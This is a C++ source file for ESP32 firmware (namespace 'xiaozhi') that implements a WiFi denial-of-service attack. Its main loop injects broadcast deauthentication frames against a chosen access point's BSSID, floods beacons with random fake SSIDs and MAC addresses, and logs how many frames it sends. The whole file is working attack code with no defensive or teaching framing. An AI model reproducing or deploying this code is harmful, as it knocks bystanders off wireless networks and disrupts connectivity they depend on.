#include "dos_attack.h"

#include <cstdlib>
#include <cstring>

#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_frame_injector.h"

namespace xiaozhi {

static const char* TAG = "DosAttack";

DosAttack::DosAttack(WifiFrameInjector* injector)
    : frame_injector_(injector) {
}

esp_err_t DosAttack::Execute(const DosAttackConfig& config,
                             const std::atomic<bool>* abort_flag,
                             AttackStatistics& stats) {
  ESP_LOGI(TAG, "Starting DoS attack");
  ESP_LOGI(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           config.target_bssid[0], config.target_bssid[1], config.target_bssid[2],
           config.target_bssid[3], config.target_bssid[4], config.target_bssid[5]);

  // Initialize statistics
  stats.frames_sent = 0;
  stats.errors = 0;
  int64_t start_time_us = esp_timer_get_time();

  // Attack loop: deauth + beacon flood
  while (true) {
    // Check abort flag
    if (abort_flag && abort_flag->load()) {
      ESP_LOGI(TAG, "DoS attack aborted by user");
      break;
    }

    // Check timeout
    int64_t now_us = esp_timer_get_time();
    int64_t elapsed_us = now_us - start_time_us;
    stats.elapsed_seconds = elapsed_us / 1000000;

    if (stats.elapsed_seconds >= config.duration_seconds) {
      ESP_LOGI(TAG, "DoS attack completed (timeout)");
      break;
    }

    // 1. Send deauth frame (broadcast)
    esp_err_t ret = frame_injector_->InjectDeauthFrame(
        config.target_bssid,
        kBroadcastMac,
        DeauthReason::kClass3FrameFromNonassocSta);

    if (ret == ESP_OK) {
      stats.frames_sent++;
    } else {
      stats.errors++;
    }

    // 2. Send fake beacons with random SSIDs
    for (uint32_t i = 0; i < kFakeBeaconCount; i++) {
      char fake_ssid[33];
      size_t fake_ssid_len;
      GenerateRandomSsid(fake_ssid, fake_ssid_len);

      // Generate random BSSID
      uint8_t fake_bssid[6];
      for (int j = 0; j < 6; j++) {
        fake_bssid[j] = esp_random() & 0xFF;
      }

      ret = frame_injector_->InjectBeaconFrame(
          fake_bssid,
          fake_ssid,
          frame_injector_->GetChannel(),
          100);

      if (ret == ESP_OK) {
        stats.frames_sent++;
      } else {
        stats.errors++;
      }
    }

    // Rate limiting
    frame_injector_->GetRateLimiter().WaitIfNeeded(1 + kFakeBeaconCount);

    // Log progress every 5 seconds
    if (stats.elapsed_seconds % 5 == 0 && stats.elapsed_seconds > 0) {
      static uint32_t last_log_second = 0;
      if (stats.elapsed_seconds != last_log_second) {
        ESP_LOGI(TAG, "Progress: %lu frames sent, %lu errors",
                 stats.frames_sent, stats.errors);
        last_log_second = stats.elapsed_seconds;
      }
    }
  }

  ESP_LOGI(TAG, "DoS attack finished: %lu frames sent, %lu errors",
           stats.frames_sent, stats.errors);

  return ESP_OK;
}

void DosAttack::GenerateRandomSsid(char* ssid_buffer, size_t& ssid_len) {
  // Generate random SSID (8-16 characters)
  ssid_len = 8 + (esp_random() % 9);  // 8-16 chars

  const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const size_t charset_len = strlen(charset);

  for (size_t i = 0; i < ssid_len; i++) {
    ssid_buffer[i] = charset[esp_random() % charset_len];
  }
  ssid_buffer[ssid_len] = '\0';
}

}  // namespace xiaozhi
